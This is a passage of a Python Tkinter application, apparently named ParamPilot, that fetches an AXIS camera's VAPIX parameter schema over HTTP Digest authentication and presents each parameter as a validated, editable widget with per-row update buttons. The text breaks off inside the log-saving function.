#!/usr/bin/env python3
#
# ParamPilot — AXIS Camera Configurator
# Copyright (c) 2025 Thalia Sophia Montreux
# PentaStar Studios / Digital DataBits Innovations
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import csv
import threading
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from urllib.parse import urlencode
import xml.etree.ElementTree as ET
import requests
from requests.auth import HTTPDigestAuth

APP_TITLE = "AXIS VAPIX Parameter Manager (Schema-Only)"
TEXT_WIDTH_MAX = 70   # hard cap for input length of plain fields
W_MIN = 10            # min character width for widgets
W_MAX = 70            # max character width for widgets (keep UI tidy)
DEFAULT_DESC_FILE = "axis_param_keys_descriptions.csv"

def now():
    from datetime import datetime as _dt
    return _dt.now().strftime("%Y-%m-%d %H:%M:%S")

# ---------------- Global Blinking Indicator ----------------
class ProcessingIndicator(ttk.Frame):
    def __init__(self, master):
        super().__init__(master)
        self._blink_job = None
        self._mode = "idle"
        self.canvas = tk.Canvas(self, width=18, height=18, highlightthickness=0, bd=0)
        self.oval = self.canvas.create_oval(3,3,15,15, fill="gray", outline="")
        self.canvas.pack(side="left", padx=(0,6))
        self.lbl_var = tk.StringVar(value="Idle")
        ttk.Label(self, textvariable=self.lbl_var).pack(side="left")
        self._on = False

    def _set_light(self, color): self.canvas.itemconfig(self.oval, fill=color)
    def _stop_blink(self):
        if self._blink_job:
            try: self.after_cancel(self._blink_job)
            except Exception: pass
            self._blink_job = None
        self._on = False
    def _blink(self, color, interval_ms=400):
        if self._mode not in ("processing","updating","closing"): return
        self._on = not self._on
        self._set_light(color if self._on else "gray")
        self._blink_job = self.after(interval_ms, self._blink, color, interval_ms)
    def _enter_mode(self, mode, label, blink_color=None, solid_color=None):
        self._mode = mode; self.lbl_var.set(label); self._stop_blink()
        if blink_color: self._blink(blink_color)
        elif solid_color: self._set_light(solid_color)
        else: self._set_light("gray")
    def start_processing(self): self._enter_mode("processing","Processing",blink_color="yellow")
    def start_updating(self): self._enter_mode("updating","Updating...",blink_color="orange")
    def done_ok(self): self._enter_mode("ok","OK",solid_color="green"); self.after(1200,lambda:self._enter_mode("idle","Idle"))
    def done_error(self): self._enter_mode("error","Error",solid_color="orange"); self.after(1500,lambda:self._enter_mode("idle","Idle"))
    def start_closing(self): self._enter_mode("closing","Closing...",blink_color="yellow")

# ---------------- Copyable Response Popup ----------------
class ResponsePopup(tk.Toplevel):
    def __init__(self, master, title, response_text):
        super().__init__(master)
        self.title(title); self.geometry("720x400"); self.minsize(480,200)
        frm = ttk.Frame(self, padding=10); frm.pack(fill="both", expand=True)
        txt = tk.Text(frm, wrap="word"); txt.insert("1.0", response_text); txt.configure(state="normal")
        txt.pack(side="left", fill="both", expand=True)
        sb = tk.Scrollbar(frm, orient="vertical", command=txt.yview, width=18)
        sb.pack(side="right", fill="y"); txt.configure(yscrollcommand=sb.set)
        btns = ttk.Frame(self, padding=(10,0,10,10)); btns.pack(fill="x")
        ttk.Button(btns, text="Copy", command=lambda: (self.clipboard_clear(), self.clipboard_append(txt.get("1.0","end-1c")))).pack(side="left")
        ttk.Button(btns, text="Close", command=self.destroy).pack(side="right")

# ---------------- XML Schema Parsing ----------------
def humanize(val: str) -> str:
    if val is None: return ""
    s = str(val).strip()
    mapping = {"yes":"Yes","no":"No","on":"On","off":"Off","auto":"Auto","none":"None",
               "password":"Password","anonymous":"Anonymous","pc":"PC","ntp":"NTP"}
    return mapping.get(s.lower(), s.replace("_"," ").title())

def parse_axis_schema_and_values(xml_text):
    """
    Parse listdefinitions xmlschema.
    Returns:
      schema_map: key -> { kind, readonly, options, labels, min, max, maxlen }
      items: ordered list of (key, current_value)
      counts: dict with basic parse counts
    """
    schema_map = {}
    items = []
    counts = {"groups":0, "parameters":0, "enums":0, "bools":0, "ints":0, "strings":0}

    def strip_tag(t): return t.split("}",1)[-1] if "}" in t else t

    try:
        root = ET.fromstring(xml_text)
    except ET.ParseError:
        return schema_map, items, counts

    def register(key, **kw):
        cur = schema_map.get(key, {})
        cur.update(kw)
        schema_map[key] = cur

    def walk(elem, path_parts):
        tag = strip_tag(elem.tag)
        if tag == "group":
            counts["groups"] += 1
            gname = elem.get("name","").strip()
            new_path = path_parts + [gname] if gname else path_parts
            for ch in elem:
                if isinstance(ch.tag, str):
                    walk(ch, new_path)
        elif tag == "parameter":
            counts["parameters"] += 1
            pname = elem.get("name","").strip()
            if not pname: return
            full_key = ".".join(path_parts + [pname])

            current_val = elem.get("value", "")
            tnode = None
            for ch in elem:
                if isinstance(ch.tag, str) and strip_tag(ch.tag) == "type":
                    tnode = ch; break

            readonly = False
            kind = "string"; opts=[]; labels=[]; minv=maxv=maxlen=None

            def first(child_name):
                if tnode is None: return None
                for c in tnode:
                    if isinstance(c.tag, str) and strip_tag(c.tag) == child_name:
                        return c
                return None

            if tnode is not None:
                readonly = (tnode.get("readonly","false").lower() == "true")

                if first("enum") is not None:
                    kind = "enum"; counts["enums"] += 1
                    for entry in first("enum"):
                        if isinstance(entry.tag, str) and strip_tag(entry.tag) == "entry":
                            val = entry.get("value")
                            if val is None: continue
                            lab = entry.get("niceValue") or humanize(val)
                            opts.append(val); labels.append((val, lab))

                elif first("bool") is not None:
                    kind = "bool"; counts["bools"] += 1
                    b = first("bool")
                    tval = b.get("true"); fval = b.get("false")
                    if tval: opts.append(tval); labels.append((tval, humanize(tval)))
                    if fval and fval not in opts:
                        opts.append(fval); labels.append((fval, humanize(fval)))

                elif first("int") is not None:
                    kind = "int"; counts["ints"] += 1
                    inode = first("int")
                    try: minv = int(inode.get("min")) if inode.get("min") else None
                    except: minv = None
                    try: maxv = int(inode.get("max")) if inode.get("max") else None
                    except: maxv = None
                    try: maxlen = int(inode.get("maxlen")) if inode.get("maxlen") else None
                    except: maxlen = None

                elif any(strip_tag(x.tag) in ("ip","ipList","hostname","password","string") for x in (tnode or [])):
                    sn = first("string") or first("password")
                    if sn is not None:
                        try: maxlen = int(sn.get("maxlen")) if sn.get("maxlen") else None
                        except: maxlen = None
                    kind = "string"; counts["strings"] += 1
                else:
                    kind = "string"; counts["strings"] += 1

            register(full_key, kind=kind, readonly=readonly, options=opts, labels=labels, min=minv, max=maxv, maxlen=maxlen)
            items.append((full_key, current_val))

    if (root is not None) and (root.tag.split('}',1)[-1] == "parameterDefinitions"):
        for ch in root:
            if isinstance(ch.tag, str):
                walk(ch, [])
    else:
        walk(root, [])

    return schema_map, items, counts

# ---------------- POSIX TZ helpers (special field) ----------------
def parse_posix_tz(val: str):
    """Parse 'GMT0BST,M3.5.0/1,M10.5.0/2' -> (std, offset, dst, (m,w,d,h), (m,w,d,h))."""
    if not val: return ("GMT","0","BST",(3,5,0,1),(10,5,0,2))
    s = val.strip()
    parts = s.split(",")
    head = parts[0] if parts else s
    start_rule = parts[1] if len(parts) > 1 else "M3.5.0/1"
    end_rule   = parts[2] if len(parts) > 2 else "M10.5.0/2"

    std = "GMT"; dst = "BST"; offset = "0"
    i = 0
    while i < len(head) and not (head[i].isdigit() or head[i] in "+-"):
        i += 1
    std = head[:i] or "GMT"
    j = i
    if j < len(head) and (head[j].isdigit() or head[j] in "+-"):
        sign = ""
        if head[j] in "+-":
            sign = head[j]; j += 1
        k = j
        while k < len(head) and head[k].isdigit(): k += 1
        num = head[j:k] or "0"
        offset = (sign + num) if num else "0"
        dst = head[k:] or "BST"
    else:
        dst = head[i:] or "BST"

    def parse_rule(r):
        try:
            core, *time_part = r.split("/")
            if not core.startswith("M"): return (3,5,0,1)
            core = core[1:]
            month, week, dow = core.split(".")
            hour = int(time_part[0]) if time_part else None
            return (int(month), int(week), int(dow), hour)
        except Exception:
            return (3,5,0,1)

    sr = parse_rule(start_rule)
    er = parse_rule(end_rule)
    if sr[3] is None: sr = (sr[0], sr[1], sr[2], 1)
    if er[3] is None: er = (er[0], er[1], er[2], 2)
    return (std, offset, dst, sr, er)

def build_posix_tz(std, offset, dst, sr, er):
    def rule(m,w,d,h): return f"M{m}.{w}.{d}/{h}"
    off = str(int(offset)) if str(offset).lstrip("+-").isdigit() else "0"
    if off.startswith("+"): off = off[1:]
    head = f"{std}{off}{dst}"
    return f"{head},{rule(*sr)},{rule(*er)}"

# ---------------- Descriptions map ----------------
class KeyDescriptions:
    def __init__(self):
        self.map = {}

    def load_csv(self, path):
        loaded = 0
        try:
            with open(path, "r", encoding="utf-8-sig", newline="") as f:
                reader = csv.reader(f)
                for row in reader:
                    if not row: continue
                    key = (row[0] or "").strip()
                    if not key or key.lower().startswith("key"):  # skip header
                        continue
                    desc = (row[1] if len(row) > 1 else "").strip()
                    if not desc: continue
                    self.map[key] = desc
                    loaded += 1
            return loaded
        except Exception as e:
            raise e

    def describe(self, key):
        return self.map.get(key, None)

# ---------------- Param Table ----------------
class ParamTable(ttk.Frame):
    def __init__(self, master, on_update_one, desc_provider: KeyDescriptions):
        super().__init__(master)
        self.on_update_one = on_update_one
        self.descriptions = desc_provider
        self._rows = []
        self._blinkers = {}
        self._schema = {}

        hdr = ttk.Frame(self); hdr.pack(fill="x")
        ttk.Label(hdr, text="Status", width=8).grid(row=0, column=0, padx=(6,4), pady=4, sticky="w")
        ttk.Label(hdr, text="Update", width=8).grid(row=0, column=1, padx=4, pady=4, sticky="w")
        ttk.Label(hdr, text="Parameter", width=60).grid(row=0, column=2, padx=4, pady=4, sticky="w")
        ttk.Label(hdr, text="Value").grid(row=0, column=3, padx=4, pady=4, sticky="w")

        self.canvas = tk.Canvas(self, borderwidth=0, highlightthickness=0)
        self.inner = ttk.Frame(self.canvas)
        self.vsb = tk.Scrollbar(self, orient="vertical", command=self.canvas.yview, width=20)
        self.canvas.configure(yscrollcommand=self.vsb.set)
        self.vsb.pack(side="right", fill="y")
        self.canvas.pack(side="left", fill="both", expand=True)
        self.inner_id = self.canvas.create_window((0,0), window=self.inner, anchor="nw")
        self.inner.bind("<Configure>", self._on_frame_configure)
        self.canvas.bind("<Configure>", self._on_canvas_configure)

        # Scroll anywhere under the table
        self.bind_all("<MouseWheel>", self._wheel_router, add="+")
        self.bind_all("<Button-4>", self._wheel_router_linux, add="+")
        self.bind_all("<Button-5>", self._wheel_router_linux, add="+")

    def set_schema(self, schema_map: dict): self._schema = schema_map or {}

    def _pointer_is_inside_table(self):
        x = self.winfo_pointerx(); y = self.winfo_pointery()
        w = self.winfo_containing(x, y)
        while w is not None:
            if w == self:
                return True
            try:
                parent_name = w.winfo_parent()
                w = w.nametowidget(parent_name) if parent_name else None
            except Exception:
                break
        return False
    def _scroll_units(self, units):
        try: self.canvas.focus_set()
        except Exception: pass
        self.canvas.yview_scroll(units, "units")
    def _wheel_router(self, event):
        if not self._pointer_is_inside_table(): return
        delta = event.delta
        if delta == 0: return "break"
        steps = -int(delta/120) if abs(delta) >= 120 else (-1 if delta > 0 else 1)
        if steps == 0: steps = 1 if delta < 0 else -1
        self._scroll_units(steps); return "break"
    def _wheel_router_linux(self, event):
        if not self._pointer_is_inside_table(): return
        if event.num == 4: self._scroll_units(-1)
        elif event.num == 5: self._scroll_units(1)
        return "break"
    def _on_frame_configure(self, _): self.canvas.configure(scrollregion=self.canvas.bbox("all"))
    def _on_canvas_configure(self, event): self.canvas.itemconfig(self.inner_id, width=event.width)

    def clear(self):
        for child in self.inner.winfo_children(): child.destroy()
        for row_idx, b in list(self._blinkers.items()):
            if b.get("job"):
                try: self.after_cancel(b["job"])
                except Exception: pass
        self._blinkers.clear(); self._rows.clear()

    def _make_light(self, parent, color="red"):
        cv = tk.Canvas(parent, width=18, height=18, highlightthickness=0, bd=0)
        oval = cv.create_oval(3,3,15,15, fill=color, outline="")
        return cv, oval

    def set_light(self, row_idx, color):
        row = self._rows[row_idx]; row["light_canvas"].itemconfig(row["light_oval"], fill=color)

    def start_blink_yellow(self, row_idx, interval_ms=400):
        self.stop_blink(row_idx); self._blinkers[row_idx] = {"job": None, "on": False}
        def _step():
            b = self._blinkers.get(row_idx)
            if not b: return
            b["on"] = not b["on"]
            self.set_light(row_idx, "yellow" if b["on"] else "gray")
            b["job"] = self.after(interval_ms, _step)
        _step()
    def stop_blink(self, row_idx):
        b = self._blinkers.get(row_idx)
        if b and b.get("job"):
            try: self.after_cancel(b["job"])
            except Exception: pass
        if row_idx in self._blinkers: del self._blinkers[row_idx]

    # ---- width calculators ----
    def _clampw(self, n): return max(W_MIN, min(W_MAX, int(n)))
    def _calc_enum_width(self, pairs, current):
        labels = [lab if (lab and str(lab).strip()) else humanize(val) for (val, lab) in pairs]
        if current and current not in [v for (v, _) in pairs]:
            labels.append(str(current))
        L = max((len(l) for l in labels), default=12)
        return self._clampw(L + 2)
    def _calc_int_width(self, sch, current):
        pieces = [str(current)]
        if sch.get("min") is not None: pieces.append(str(sch["min"]))
        if sch.get("max") is not None: pieces.append(str(sch["max"]))
        L = max((len(p) for p in pieces if p is not None), default=4)
        return self._clampw(L + 2)
    def _calc_str_width(self, sch, current):
        maxlen = sch.get("maxlen")
        cap = min([l for l in [maxlen, TEXT_WIDTH_MAX] if l is not None] or [TEXT_WIDTH_MAX])
        L = min(cap, 48)
        L = max(L, min(len(str(current)) + 2, cap))
        return self._clampw(L)

    # ---- Special POSIX Time Zone composite widget ----
    def _posix_tz_widget(self, parent, value):
        std, off, dst, sr, er = parse_posix_tz(value)

        wrap = ttk.Frame(parent)
        row1 = ttk.Frame(wrap); row1.pack_fill = row1.pack(fill="x", pady=(0,4))
        row2 = ttk.Frame(wrap); row2.pack(fill="x", pady=(0,2))
        row3 = ttk.Frame(wrap); row3.pack(fill="x")

        std_opts = ["GMT","UTC","WET","CET","EET","MSK","AST","EST","CST","MST","PST"]
        dst_opts = ["BST","WEST","CEST","EEST","MSD","ADT","EDT","CDT","MDT","PDT"]
        if std not in std_opts: std_opts.insert(0, std)
        if dst not in dst_opts: dst_opts.insert(0, dst)

        ttk.Label(row1, text="Standard:").pack(side="left")
        std_var = tk.StringVar(value=std)
        std_cb = ttk.Combobox(row1, textvariable=std_var, values=std_opts, state="readonly", width=max(4, len(max(std_opts,key=len))))
        std_cb.pack(side="left", padx=(4,12))

        ttk.Label(row1, text="Offset (hrs):").pack(side="left")
        off_var = tk.StringVar(value=str(int(off) if str(off).lstrip("+-").isdigit() else 0))
        off_sp = tk.Spinbox(row1, from_=-12, to=14, textvariable=off_var, width=5)
        off_sp.pack(side="left", padx=(4,12))

        ttk.Label(row1, text="DST:").pack(side="left")
        dst_var = tk.StringVar(value=dst)
        dst_cb = ttk.Combobox(row1, textvariable=dst_var, values=dst_opts, state="readonly", width=max(4, len(max(dst_opts,key=len))))
        dst_cb.pack(side="left", padx=(4,0))

        def week_values(): return [1,2,3,4,5]  # 5 = last
        def dow_values(): return [(0,"Sun"),(1,"Mon"),(2,"Tue"),(3,"Wed"),(4,"Thu"),(5,"Fri"),(6,"Sat")]

        ttk.Label(row2, text="DST starts: M").pack(side="left")
        s_month = tk.IntVar(value=sr[0]); tk.Spinbox(row2, from_=1, to=12, textvariable=s_month, width=3).pack(side="left")
        ttk.Label(row2, text=".").pack(side="left")
        s_week = tk.IntVar(value=sr[1]); ttk.Combobox(row2, textvariable=s_week, values=week_values(), width=3, state="readonly").pack(side="left")
        ttk.Label(row2, text=".").pack(side="left")
        s_dow_cb = ttk.Combobox(row2, state="readonly", width=4,
                                values=[f"{d}:{name}" for d,name in dow_values()])
        s_dow_cb.set(f"{sr[2]}:{dict(dow_values())[sr[2]]}")
        s_dow_cb.pack(side="left")
        ttk.Label(row2, text="/").pack(side="left")
        s_hour = tk.IntVar(value=sr[3]); tk.Spinbox(row2, from_=0, to=23, textvariable=s_hour, width=3).pack(side="left")
        ttk.Label(row2, text=" (hour)").pack(side="left")

        ttk.Label(row3, text="DST ends:   M").pack(side="left")
        e_month = tk.IntVar(value=er[0]); tk.Spinbox(row3, from_=1, to=12, textvariable=e_month, width=3).pack(side="left")
        ttk.Label(row3, text=".").pack(side="left")
        e_week = tk.IntVar(value=er[1]); ttk.Combobox(row3, textvariable=e_week, values=week_values(), width=3, state="readonly").pack(side="left")
        ttk.Label(row3, text=".").pack(side="left")
        e_dow_cb = ttk.Combobox(row3, state="readonly", width=4,
                                values=[f"{d}:{name}" for d,name in dow_values()])
        e_dow_cb.set(f"{er[2]}:{dict(dow_values())[er[2]]}")
        e_dow_cb.pack(side="left")
        ttk.Label(row3, text="/").pack(side="left")
        e_hour = tk.IntVar(value=er[3]); tk.Spinbox(row3, from_=0, to=23, textvariable=e_hour, width=3).pack(side="left")
        ttk.Label(row3, text=" (hour)").pack(side="left")

        wrap.pack(fill="x", expand=False)

        def getter():
            try:
                s_d = int(s_dow_cb.get().split(":")[0])
                e_d = int(e_dow_cb.get().split(":")[0])
            except Exception:
                s_d = sr[2]; e_d = er[2]
            sr_tuple = (int(s_month.get()), int(s_week.get()), s_d, int(s_hour.get()))
            er_tuple = (int(e_month.get()), int(e_week.get()), e_d, int(e_hour.get()))
            return build_posix_tz(std_var.get().strip() or "GMT",
                                  off_var.get().strip() or "0",
                                  dst_var.get().strip() or "BST",
                                  sr_tuple, er_tuple)

        return wrap, getter

    # ---- widgets for general fields ----
    def _dropdown_with_labels(self, parent, current, pairs, width_chars):
        curr = "" if current is None else str(current)
        values = []
        label_to_value = {}
        seen = set()
        def add(val, lab):
            if val in seen: return
            seen.add(val); values.append(lab); label_to_value[lab] = val
        if curr and all(v != curr for (v, _) in pairs):
            add(curr, curr)
        for (v, lab) in pairs:
            lab = lab if (lab and str(lab).strip()) else humanize(v)
            add(str(v), lab)
        init_label = next((lab for lab,val in label_to_value.items() if val == curr), (values[0] if values else ""))
        var = tk.StringVar(value=init_label)
        cb = ttk.Combobox(parent, textvariable=var, values=values, state="readonly", width=width_chars)
        cb.pack(fill="x", expand=False)
        return cb, (lambda v=var, lut=label_to_value: lut.get(v.get(), v.get()))
    def _yes_no(self, parent, current):
        var = tk.StringVar(value=(current if current in ("yes","no") else "no"))
        wrap = ttk.Frame(parent)
        ttk.Radiobutton(wrap, text="Yes", value="yes", variable=var).pack(side="left", padx=(0,8))
        ttk.Radiobutton(wrap, text="No",  value="no",  variable=var).pack(side="left")
        wrap.pack(fill="x", expand=False)
        return wrap, (lambda v=var: v.get())
    def _on_off(self, parent, current):
        var = tk.StringVar(value=(current if current in ("on","off") else "off"))
        wrap = ttk.Frame(parent)
        ttk.Radiobutton(wrap, text="On",  value="on",  variable=var).pack(side="left", padx=(0,8))
        ttk.Radiobutton(wrap, text="Off", value="off", variable=var).pack(side="left")
        wrap.pack(fill="x", expand=False)
        return wrap, (lambda v=var: v.get())
    def _int_widget(self, parent, current, minv, maxv, width_chars):
        var = tk.StringVar(value=str(current if current is not None else "0"))
        if minv is not None and maxv is not None and minv <= maxv:
            sp = tk.Spinbox(parent, from_=minv, to=maxv, textvariable=var, width=width_chars)
            sp.pack(fill="x", expand=False)
            return sp, (lambda v=var: v.get())
        ent = ttk.Entry(parent, textvariable=var, width=width_chars)
        ent.pack(fill="x", expand=False)
        return ent, (lambda v=var: v.get())
    def _string_widget(self, parent, current, maxlen, width_chars):
        var = tk.StringVar(value=current)
        ent = ttk.Entry(parent, textvariable=var, width=width_chars)
        ent.pack(fill="x", expand=False)
        cap = min([l for l in [maxlen, TEXT_WIDTH_MAX] if l is not None] or [TEXT_WIDTH_MAX])
        def enforce_len(*_):
            s = var.get()
            if len(s) > cap: var.set(s[:cap])
        var.trace_add("write", enforce_len)
        return ent, (lambda v=var: v.get())

    def _best_widget_for(self, key, value):
        if key == "root.Time.POSIXTimeZone":
            return lambda parent: self._posix_tz_widget(parent, value)

        sch = self._schema.get(key, {"kind":"string"})
        kind = sch.get("kind","string")
        labels = sch.get("labels") or []
        options = sch.get("options") or []
        minv = sch.get("min"); maxv = sch.get("max"); maxlen = sch.get("maxlen")

        if kind in ("enum","bool") and (labels or options):
            pairs = labels if labels else [(o, humanize(o)) for o in options]
            w = self._calc_enum_width(pairs, value)
            return lambda parent: self._dropdown_with_labels(parent, value, pairs, w)

        if str(value).lower() in ("yes","no") and not (labels or options):
            return lambda parent: self._yes_no(parent, str(value).lower())
        if str(value).lower() in ("on","off") and not (labels or options):
            return lambda parent: self._on_off(parent, str(value).lower())

        if kind == "int":
            try: cur_int = int(str(value).strip())
            except: cur_int = 0
            w = self._calc_int_width(sch, cur_int)
            return lambda parent: self._int_widget(parent, cur_int, minv, maxv, w)

        w = self._calc_str_width(sch, value)
        return lambda parent: self._string_widget(parent, value, (maxlen or TEXT_WIDTH_MAX), w)

    def populate(self, items):
        self.clear()
        for r, (k, v) in enumerate(items):
            # Status light
            light_cell = ttk.Frame(self.inner)
            light_cell.grid(row=r, column=0, sticky="w", padx=(6,4), pady=3)
            cv, oval = self._make_light(light_cell, "red"); cv.pack()

            # Value widget cell (created before button to capture getter)
            val_cell = ttk.Frame(self.inner)
            widget_factory = self._best_widget_for(k, v)
            widget, getter = widget_factory(val_cell)

            # Update button (left side, next to light)
            btn = ttk.Button(self.inner, text="Update",
                             command=(lambda idx=r, key=k, getv=getter: self._on_click_update(idx, key, getv)))
            btn.grid(row=r, column=1, sticky="w", padx=4, pady=3)

            # Pretty parameter label cell (description if available)
            label_cell = ttk.Frame(self.inner)
            label_cell.grid(row=r, column=2, sticky="w", padx=4, pady=3)
            pretty = self.descriptions.describe(k)
            if pretty:
                ttk.Label(label_cell, text=pretty, style="ParamTitle.TLabel").pack(side="top", anchor="w")
                ttk.Label(label_cell, text=k, foreground="#777777").pack(side="top", anchor="w")
            else:
                ttk.Label(label_cell, text=k).pack(side="top", anchor="w")

            # Value widget
            val_cell.grid(row=r, column=3, sticky="w", padx=4, pady=3)

            sch = self._schema.get(k, {})
            if sch.get("readonly"):
                for w in (widget, btn):
                    try: w.state(["disabled"])
                    except Exception:
                        try: w.configure(state="disabled")
                        except Exception: pass

            self._rows.append({"key": k, "light_canvas": cv, "light_oval": oval, "getter": getter, "schema": sch})

        for c in range(4): self.inner.grid_columnconfigure(c, weight=1 if c in (2,3) else 0)

    def _validate_value(self, key, value):
        if key == "root.Time.POSIXTimeZone":
            ok = ("," in value and value.count(",") == 2 and "M" in value)
            return (ok, None if ok else "Invalid POSIX time zone format.")
        sch = self._schema.get(key, {})
        kind = sch.get("kind","string")
        if kind in ("enum","bool"):
            opts = set(sch.get("options") or [v for (v, _) in (sch.get("labels") or [])])
            if opts and value not in opts:
                return False, f"Value '{value}' is not allowed. Allowed: {', '.join(sorted(opts))}"
            return True, None
        if kind == "int":
            try: iv = int(str(value).strip())
            except: return False, f"Value '{value}' must be an integer."
            minv = sch.get("min"); maxv = sch.get("max")
            if minv is not None and iv < minv: return False, f"Value {iv} < min {minv}"
            if maxv is not None and iv > maxv: return False, f"Value {iv} > max {maxv}"
            return True, None
        mv = sch.get("maxlen")
        cap = min([l for l in [mv, TEXT_WIDTH_MAX] if l is not None] or [TEXT_WIDTH_MAX])
        if len(str(value)) > cap:
            return False, f"Value too long (>{cap} chars)."
        return True, None

    def _on_click_update(self, row_idx, key, getter):
        value = getter()
        ok, err = self._validate_value(key, value)
        if not ok:
            messagebox.showerror("Invalid value", f"{key}\n{err}")
            return
        self.start_blink_yellow(row_idx)
        self.on_update_one(key, value, {"row_idx": row_idx})

# ---------------- Main App ----------------
class AxisGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE)
        try: self.state("zoomed")
        except Exception: self.geometry("1200x820")
        self.minsize(1100, 760)

        self.host_var = tk.StringVar(value="192.168.5.40")
        self.port_var = tk.StringVar(value="")
        self.user_var = tk.StringVar(value="root")
        self.pass_var = tk.StringVar(value="")
        self.group_var = tk.StringVar(value="")

        self.processing = None
        self.key_desc = KeyDescriptions()
        self._build_ui()
        self._try_autoload_descriptions()
        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _build_ui(self):
        # Styles for pretty label
        try:
            style = ttk.Style()
            style.configure("ParamTitle.TLabel", font=("Segoe UI", 10, "bold"))
        except Exception:
            pass

        root = ttk.Frame(self, padding=10); root.pack(fill="both", expand=True)

        conn = ttk.LabelFrame(root, text="Connection (HTTP + Digest)")
        conn.pack(fill="x", pady=(0,8))
        ttk.Label(conn, text="Scheme:").grid(row=0, column=0, padx=(10,6), pady=6, sticky="w")
        ttk.Label(conn, text="http (fixed)").grid(row=0, column=1, padx=(0,12), pady=6, sticky="w")
        ttk.Label(conn, text="Host/IP:").grid(row=0, column=2, padx=(4,6), pady=6, sticky="w")
        ttk.Entry(conn, textvariable=self.host_var, width=22).grid(row=0, column=3, padx=(0,12), pady=6, sticky="w")
        ttk.Label(conn, text="Port:").grid(row=0, column=4, padx=(4,6), pady=6, sticky="w")
        ttk.Entry(conn, textvariable=self.port_var, width=8).grid(row=0, column=5, padx=(0,12), pady=6, sticky="w")
        ttk.Label(conn, text="Username:").grid(row=0, column=6, padx=(4,6), pady=6, sticky="w")
        ttk.Entry(conn, textvariable=self.user_var, width=16).grid(row=0, column=7, padx=(0,12), pady=6, sticky="w")
        ttk.Label(conn, text="Password:").grid(row=0, column=8, padx=(4,6), pady=6, sticky="w")
        ttk.Entry(conn, textvariable=self.pass_var, show="•", width=16).grid(row=0, column=9, padx=(0,12), pady=6, sticky="w")

        self.processing = ProcessingIndicator(conn)
        self.processing.grid(row=0, column=10, padx=(12,10), pady=6, sticky="e")
        for c in range(0, 11): conn.grid_columnconfigure(c, weight=1 if c == 9 else 0)

        acts = ttk.LabelFrame(root, text="Build from Schema")
        acts.pack(fill="x", pady=(0,8))
        ttk.Label(acts, text="Group prefix filter (optional, e.g., root.Network):").grid(row=0, column=0, padx=(10,6), pady=6, sticky="w")
        ttk.Entry(acts, textvariable=self.group_var, width=40).grid(row=0, column=1, padx=(0,10), pady=6, sticky="w")
        ttk.Button(acts, text="Fetch & Build (Schema Only)", command=self._on_build_from_schema).grid(row=0, column=2, padx=6, pady=6, sticky="w")
        ttk.Button(acts, text="Refresh (Schema Only)", command=self._on_build_from_schema).grid(row=0, column=3, padx=6, pady=6, sticky="w")
        ttk.Button(acts, text="Load Descriptions…", command=self._load_descriptions_dialog).grid(row=0, column=4, padx=6, pady=6, sticky="w")

        tbl_box = ttk.LabelFrame(root, text="Parameters (from listdefinitions xmlschema; Update sends ONE change)")
        tbl_box.pack(fill="both", expand=True)
        self.param_table = ParamTable(tbl_box, on_update_one=self._on_update_one_clicked, desc_provider=self.key_desc)
        self.param_table.pack(fill="both", expand=True, padx=6, pady=6)

        logf = ttk.LabelFrame(root, text="Debug Log (password masked; Digest fixed)")
        logf.pack(fill="x", expand=False, pady=(8,0))
        self.log_text = tk.Text(logf, wrap="none", height=4, undo=False)
        self.log_text.pack(side="left", fill="x", expand=True, padx=(8,0), pady=8)
        yscroll = tk.Scrollbar(logf, orient="vertical", command=self.log_text.yview, width=18)
        yscroll.pack(side="right", fill="y", padx=(0,8), pady=8)
        self.log_text.configure(yscrollcommand=yscroll.set)

        btns = ttk.Frame(root); btns.pack(fill="x", pady=(4,0))
        ttk.Button(btns, text="Copy Log", command=self.copy_log).pack(side="left", padx=6)
        ttk.Button(btns, text="Save Log…", command=self.save_log).pack(side="left", padx=6)
        ttk.Button(btns, text="Clear Log", command=self.clear_log).pack(side="left", padx=6)

        # Make scrollbar visually chunky
        try:
            style = ttk.Style()
            style.layout("Vertical.TScrollbar", style.layout("Vertical.TScrollbar"))
            style.configure("Vertical.TScrollbar", troughcolor="#d0d0d0", background="#a0a0a0", arrowcolor="#333333")
        except Exception:
            pass

    # --- Descriptions handling
    def _try_autoload_descriptions(self):
        # Try same folder as script/exe
        try_paths = []
        try:
            base = os.path.dirname(os.path.abspath(__file__))
            try_paths.append(os.path.join(base, DEFAULT_DESC_FILE))
        except Exception:
            pass
        # Also try CWD
        try_paths.append(os.path.join(os.getcwd(), DEFAULT_DESC_FILE))

        for p in try_paths:
            if os.path.isfile(p):
                try:
                    n = self.key_desc.load_csv(p)
                    self._log(f"[{now()}] Loaded {n} key descriptions from: {p}")
                    return
                except Exception as e:
                    self._log(f"[{now()}] Failed to auto-load descriptions from {p}: {e}")

    def _load_descriptions_dialog(self):
        path = filedialog.askopenfilename(title="Select Key Descriptions CSV",
                                          filetypes=[("CSV files","*.csv"),("All files","*.*")])
        if not path: return
        try:
            n = self.key_desc.load_csv(path)
            self._log(f"[{now()}] Loaded {n} key descriptions from: {path}")
            # If table is already populated, re-render to apply pretty labels
            try:
                # Trigger a soft refresh without re-fetching from camera
                for child in self.param_table.inner.winfo_children():
                    pass
                # We can't reconstruct items easily from the table; advise to refresh:
                messagebox.showinfo("Descriptions loaded", "Descriptions loaded.\nClick Refresh to re-render the table with friendly names.")
            except Exception:
                pass
        except Exception as e:
            messagebox.showerror("Load failed", f"Could not load CSV:\n{e}")

    def _on_close(self):
        try: self.processing.start_closing()
        finally: self.after(10, self.destroy)

    # ---- Logging
    def _log(self, text):
        self.log_text.insert("end", f"{text}\n")
        curr = self.log_text.get("1.0", "end-1c")
        if len(curr) > 4000:
            self.log_text.delete("1.0", f"1.0+{len(curr)-4000}c")
        self.log_text.see("end")
    def copy_log(self):
        self.clipboard_clear(); self.clipboard_append(self.log_text.get("1.0","end-1c"))
        self._log(f"[{now()}] Copied log to clipboard.")
    def save_log(self):
        text = self.log_text.get("1.0","end-1c")
        if not text.strip(): messagebox.showinfo("Save Log", "Log is empty."); return
        path = filedialog.asksaveasfilename(defaultextension=".txt",
                                            filetypes=[("Text files","*.txt"),("All files","*.*")],
